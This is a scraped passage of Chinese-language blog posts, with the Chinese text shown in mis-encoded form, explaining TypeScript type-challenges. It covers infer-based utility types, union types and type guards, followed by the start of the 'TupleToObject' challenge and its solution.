<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-title class_">Fn</span>&gt; = <span class="hljs-title class_">Fn</span> <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// æµ‹è¯•ç”¨å‡½æ•°</span>
<span class="hljs-keyword">const</span> add = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a + b;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getUser</span> = (<span class="hljs-params"/>) =&gt; ({ <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> });

<span class="hljs-comment">// ä½¿ç”¨ç±»å‹å·¥å…·</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddReturn</span> = <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-keyword">typeof</span> add&gt;; <span class="hljs-comment">// AddReturn ç±»å‹ä¸º number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UserReturn</span> = <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-keyword">typeof</span> getUser&gt;; <span class="hljs-comment">// UserReturn ç±»å‹ä¸º { name: string; age: number }</span>
</code></pre>
<h5 data-id="heading-9">2. æå–æ•°ç»„çš„å…ƒç´ ç±»å‹</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ç±»å‹å·¥å…·ï¼šæå–æ•°ç»„å…ƒç´ ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetArrayItem</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (infer <span class="hljs-title class_">Item</span>)[] ? <span class="hljs-title class_">Item</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;<span class="hljs-built_in">number</span>[]&gt;; <span class="hljs-comment">// NumberArray ç±»å‹ä¸º number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;<span class="hljs-built_in">string</span>[]&gt;; <span class="hljs-comment">// StringArray ç±»å‹ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MixedArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;[<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>]&gt;; <span class="hljs-comment">// MixedArray ç±»å‹ä¸º string | number</span>
</code></pre>
<h5 data-id="heading-10">3. æå– Promise çš„æ³›å‹å‚æ•°ç±»å‹</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ç±»å‹å·¥å…·ï¼šæå– Promise çš„æ³›å‹ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetPromiseValue</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer <span class="hljs-title class_">Value</span>&gt; ? <span class="hljs-title class_">Value</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">PromiseString</span> = <span class="hljs-title class_">GetPromiseValue</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// PromiseString ç±»å‹ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">PromiseUser</span> = <span class="hljs-title class_">GetPromiseValue</span>&lt;<span class="hljs-title class_">Promise</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span> }&gt;&gt;; <span class="hljs-comment">// PromiseUser ç±»å‹ä¸º { id: number }</span>
</code></pre>
<h5 data-id="heading-11">4. æå–å‡½æ•°çš„å‚æ•°ç±»å‹</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ç±»å‹å·¥å…·ï¼šæå–å‡½æ•°å‚æ•°ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-title class_">Fn</span>&gt; = <span class="hljs-title class_">Fn</span> <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: infer <span class="hljs-title class_">Params</span>) =&gt; <span class="hljs-built_in">any</span> ? <span class="hljs-title class_">Params</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">const</span> fn = (<span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {};
<span class="hljs-keyword">type</span> <span class="hljs-title class_">FnParams</span> = <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;; <span class="hljs-comment">// FnParams ç±»å‹ä¸º [string, number]</span>

<span class="hljs-comment">// è¿›ä¸€æ­¥ï¼šæå–ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">FirstParam</span> = <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;[<span class="hljs-number">0</span>]; <span class="hljs-comment">// FirstParam ç±»å‹ä¸º string</span>
</code></pre>
<h4 data-id="heading-12"><code>|</code></h4>
<p><code>|</code> è¿ç®—ç¬¦ç”¨äºè¡¨ç¤ºè”åˆç±»å‹ï¼Œå³ä¸€ä¸ªå€¼å¯ä»¥æ˜¯å¤šä¸ªç±»å‹ä¸­çš„ä»»æ„ä¸€ä¸ªã€‚</p>
<ol>
<li>å˜é‡çš„è”åˆç±»å‹æ³¨è§£</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å˜é‡ a å¯ä»¥æ˜¯å­—ç¬¦ä¸² OR æ•°å­—</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>;

<span class="hljs-comment">// åˆæ³•èµ‹å€¼ï¼ˆç¬¦åˆä»»æ„ä¸€ç§ç±»å‹ï¼‰</span>
a = <span class="hljs-string">"TS"</span>;
a = <span class="hljs-number">123</span>;

<span class="hljs-comment">// éæ³•èµ‹å€¼ï¼ˆä¸å±äºè”åˆç±»å‹ä¸­çš„ä»»ä½•ä¸€ç§ï¼‰ï¼ŒTS ç›´æ¥æŠ¥é”™</span>
a = <span class="hljs-literal">true</span>; <span class="hljs-comment">// âŒ ç±»å‹ 'boolean' ä¸èƒ½èµ‹å€¼ç»™ç±»å‹ 'string | number'</span>
</code></pre>
<ol start="2">
<li>å‡½æ•°å‚æ•°çš„è”åˆç±»å‹</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å‡½æ•°æ¥æ”¶ string æˆ– number ç±»å‹çš„å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printValue</span>(<span class="hljs-params">val: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(val);
}

<span class="hljs-comment">// åˆæ³•è°ƒç”¨</span>
<span class="hljs-title function_">printValue</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_">printValue</span>(<span class="hljs-number">666</span>);

<span class="hljs-comment">// éæ³•è°ƒç”¨ï¼ŒTS æŠ¥é”™</span>
<span class="hljs-title function_">printValue</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// âŒ</span>
</code></pre>
<ol start="3">
<li>æ•°ç»„çš„è”åˆç±»å‹ï¼ˆæ³¨æ„ä¸¤ç§å†™æ³•çš„åŒºåˆ«ï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å†™æ³•1ï¼š(A | B)[] â€”â€” æ•°ç»„çš„ã€Œæ¯ä¸ªå…ƒç´ ã€å¯ä»¥æ˜¯ A æˆ– Bï¼ˆæ··åˆæ•°ç»„ï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr1</span>: (<span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>)[] = [<span class="hljs-number">1</span>, <span class="hljs-string">"2"</span>, <span class="hljs-number">3</span>, <span class="hljs-string">"4"</span>]; <span class="hljs-comment">// åˆæ³•</span>

<span class="hljs-comment">// å†™æ³•2ï¼šA[] | B[] â€”â€” ã€Œæ•´ä¸ªæ•°ç»„ã€è¦ä¹ˆå…¨æ˜¯ A ç±»å‹ï¼Œè¦ä¹ˆå…¨æ˜¯ B ç±»å‹ï¼ˆçº¯æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr2</span>: <span class="hljs-built_in">string</span>[] | <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]; <span class="hljs-comment">// åˆæ³•ï¼ˆå…¨æ•°å­—ï¼‰</span>
arr2 = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>, <span class="hljs-string">"3"</span>]; <span class="hljs-comment">// åˆæ³•ï¼ˆå…¨å­—ç¬¦ä¸²ï¼‰</span>
arr2 = [<span class="hljs-number">1</span>, <span class="hljs-string">"2"</span>]; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šæ··åˆç±»å‹ä¸ç¬¦åˆè¦æ±‚</span>
</code></pre>
<p>å½“ä½¿ç”¨è”åˆç±»å‹çš„æ—¶å€™ï¼Œè®¿é—®æŸä¸€ä¸ªå­ç±»å‹çš„ä¸“å±å±æ€§ / æ–¹æ³•æ—¶ï¼Œéœ€è¦è¿›è¡Œç±»å‹å®ˆå«ï¼Œå¯ç”¨çš„æ–¹æ³•æœ‰ <code>typeof</code> ã€<code>in</code> ã€<code>switch</code> ã€<code>instanceof</code> ã€‚</p>
<ol>
<li><code>typeof</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getLength</span>(<span class="hljs-params">val: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-comment">// ç±»å‹çª„åŒ–ï¼šåˆ¤æ–­ val æ˜¯ string ç±»å‹</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val === <span class="hljs-string">"string"</span>) {
    <span class="hljs-comment">// æ­¤åˆ†æ”¯ä¸­ï¼ŒTS ç¡®å®š val æ˜¯ stringï¼Œå¯å®‰å…¨ä½¿ç”¨ length</span>
    <span class="hljs-keyword">return</span> val.<span class="hljs-property">length</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// æ­¤åˆ†æ”¯ä¸­ï¼ŒTS ç¡®å®š val æ˜¯ numberï¼Œæ‰§è¡Œæ•°å­—ç›¸å…³é€»è¾‘</span>
    <span class="hljs-keyword">return</span> val.<span class="hljs-title function_">toString</span>().<span class="hljs-property">length</span>;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"TS"</span>)); <span class="hljs-comment">// 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>(<span class="hljs-number">1234</span>)); <span class="hljs-comment">// 4</span>
</code></pre>
<ol start="2">
<li><code>in</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">printUserInfo</span>(<span class="hljs-params">user: { name: <span class="hljs-built_in">string</span> } | { age: <span class="hljs-built_in">number</span> }</span>) {
  <span class="hljs-comment">// ç±»å‹çª„åŒ–ï¼šåˆ¤æ–­ user æ˜¯å¦æœ‰ name å±æ€§ï¼ˆå³æ˜¯å¦æ˜¯ { name: string } ç±»å‹ï¼‰</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-string">"name"</span> <span class="hljs-keyword">in</span> user) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">${user.name}</span>`</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// æ­¤åˆ†æ”¯ä¸­ï¼ŒTS ç¡®å®š user æ˜¯ { age: number } ç±»å‹</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Age: <span class="hljs-subst">${user.age}</span>`</span>);
  }
}
</code></pre>
<ol start="3">
<li><code>switch</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">"user"</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">"admin"</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">permission</span>: <span class="hljs-built_in">string</span>[];
}
<span class="hljs-comment">// è”åˆç±»å‹ï¼šå¯ä»¥æ˜¯ User æˆ– Admin</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> = <span class="hljs-title class_">User</span> | <span class="hljs-title class_">Admin</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printPerson</span>(<span class="hljs-params">p: Person</span>) {
  <span class="hljs-keyword">switch</span> (p.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"user"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">age</span>); <span class="hljs-comment">// ç¡®å®šæ˜¯ User</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"admin"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">permission</span>); <span class="hljs-comment">// ç¡®å®šæ˜¯ Admin</span>
      <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<ol start="4">
<li><code>instanceof</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ä¸¤ä¸ªç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ±ªæ±ª"</span>); }
}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> {
  <span class="hljs-title function_">meow</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å–µå–µ"</span>); }
}

<span class="hljs-comment">// è”åˆç±»å‹ï¼šDog æˆ– Cat å®ä¾‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Animal</span> = <span class="hljs-title class_">Dog</span> | <span class="hljs-title class_">Cat</span>;

<span class="hljs-comment">// instanceof ç±»å‹å®ˆå«ï¼ˆé’ˆå¯¹ç±»å®ä¾‹ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">animalCall</span>(<span class="hljs-params">animal: Animal</span>) {
  <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>) {
    animal.<span class="hljs-title function_">bark</span>();
  } <span class="hljs-keyword">else</span> {
    animal.<span class="hljs-title function_">meow</span>();
  }
}

<span class="hljs-title function_">animalCall</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>()); <span class="hljs-comment">// æ±ªæ±ª</span>
<span class="hljs-title function_">animalCall</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>()); <span class="hljs-comment">// å–µå–µ</span>
</code></pre>
<h3 data-id="heading-13">æµ‹è¯•ç”¨ä¾‹</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ æµ‹è¯•ç”¨ä¾‹ _____________ */</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Equal</span>, <span class="hljs-title class_">Expect</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@type-challenges/utils'</span>

<span class="hljs-keyword">type</span> cases = [
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToUnion</span>&lt;[<span class="hljs-number">123</span>, <span class="hljs-string">'456'</span>, <span class="hljs-literal">true</span>]&gt;, <span class="hljs-number">123</span> | <span class="hljs-string">'456'</span> | <span class="hljs-literal">true</span>&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToUnion</span>&lt;[<span class="hljs-number">123</span>]&gt;, <span class="hljs-number">123</span>&gt;&gt;,
]

</code></pre>
<h3 data-id="heading-14">ç›¸å…³é“¾æ¥</h3>
<blockquote>
<p>åˆ†äº«ä½ çš„è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fanswer%2Fzh-CN" target="_blank" title="https://tsch.js.org/10/answer/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/10/answer/zâ€¦</a>
æŸ¥çœ‹è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fsolutions" target="_blank" title="https://tsch.js.org/10/solutions" ref="nofollow noopener noreferrer">tsch.js.org/10/solutionâ€¦</a>
æ›´å¤šé¢˜ç›®ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2Fzh-CN" target="_blank" title="https://tsch.js.org/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/zh-CN</a></p>
</blockquote>
<p>ä¸‹é¢æ˜¯æˆ‘çš„å…¬ä¼—å·ï¼Œæ¬¢è¿å…³æ³¨ã€‚å…³æ³¨åæœ‰æ–°çš„åŠŸèƒ½ç‚¹ä¼šåŠæ—¶æ”¶åˆ°æ¨é€ã€‚</p>
<blockquote>
<p>å®æˆ˜ä¸ºç‹ï¼ä¸“æ³¨äºæ±‡æ€»å„ç§åŠŸèƒ½ç‚¹ï¼Œè‡´åŠ›äºæ‰“é€ ä¸€ç³»åˆ—èƒ½å¤Ÿå¸®åŠ©å·¥ç¨‹å¸ˆå®ç°å„ç§åŠŸèƒ½çš„æƒ³æ³•æ€è·¯çš„ä¼˜è´¨æ–‡ç« ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bdeec99a0154e7aa73c1c6765f3dcf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZnhzcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390836&amp;x-signature=Ml919VoDzxim80t0Nxp2fWwDcdA%3D" alt="å‰ç«¯åŠŸèƒ½ç‚¹" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 11 - å…ƒç»„è½¬æ¢ä¸ºå¯¹è±¡]]></title>    <link>https://juejin.cn/post/7600955777316274214</link>    <guid>https://juejin.cn/post/7600955777316274214</guid>    <pubDate>2026-01-30T15:20:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316274214" data-draft-id="7600953879501275187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 11 - å…ƒç»„è½¬æ¢ä¸ºå¯¹è±¡"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-30T15:20:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fxss"/> <meta itemprop="url" content="https://juejin.cn/user/3702810892856808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 11 - å…ƒç»„è½¬æ¢ä¸ºå¯¹è±¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810892856808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fxss
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:20:03.000Z" title="Fri Jan 30 2026 15:20:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">11 - å…ƒç»„è½¬æ¢ä¸ºå¯¹è±¡</h2>
<p>by sinoon (@sinoon) #ç®€å• #object-keys</p>
<h3 data-id="heading-1">é¢˜ç›®</h3>
<p>å°†ä¸€ä¸ªå…ƒç»„ç±»å‹è½¬æ¢ä¸ºå¯¹è±¡ç±»å‹ï¼Œè¿™ä¸ªå¯¹è±¡ç±»å‹çš„é”®/å€¼å’Œå…ƒç»„ä¸­çš„å…ƒç´ å¯¹åº”ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> tuple = [<span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>

<span class="hljs-keyword">type</span> result = <span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tuple&gt; <span class="hljs-comment">// expected { 'tesla': 'tesla', 'model 3': 'model 3', 'model X': 'model X', 'model Y': 'model Y'}</span>
</code></pre>
<blockquote>
<p>åœ¨ Github ä¸ŠæŸ¥çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fzh-CN" target="_blank" title="https://tsch.js.org/11/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/11/zh-CN</a></p>
</blockquote>
<h3 data-id="heading-2">ä»£ç </h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ ä½ çš„ä»£ç  _____________ */</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleToObject</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-title class_">PropertyKey</span>[]&gt; = {
  [P <span class="hljs-keyword">in</span> T[<span class="hljs-built_in">number</span>]]: P
}

</code></pre>
<p>å…³é”®è§£é‡Šï¼š</p>
<ul>
<li><code>type PropertyKey = string | number | symbol</code>ã€‚</li>
<li><code>T extends readonly PropertyKey[]</code> ç”¨äºé™åˆ¶ <code>T</code> å¿…é¡»æ˜¯ä¸€ä¸ªåªè¯»çš„å±æ€§é”®å…ƒç»„ã€‚</li>
<li><code>[P in T[number]]</code> ç”¨äºéå†å…ƒç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†å…¶ä½œä¸ºå¯¹è±¡çš„é”®ã€‚</li>
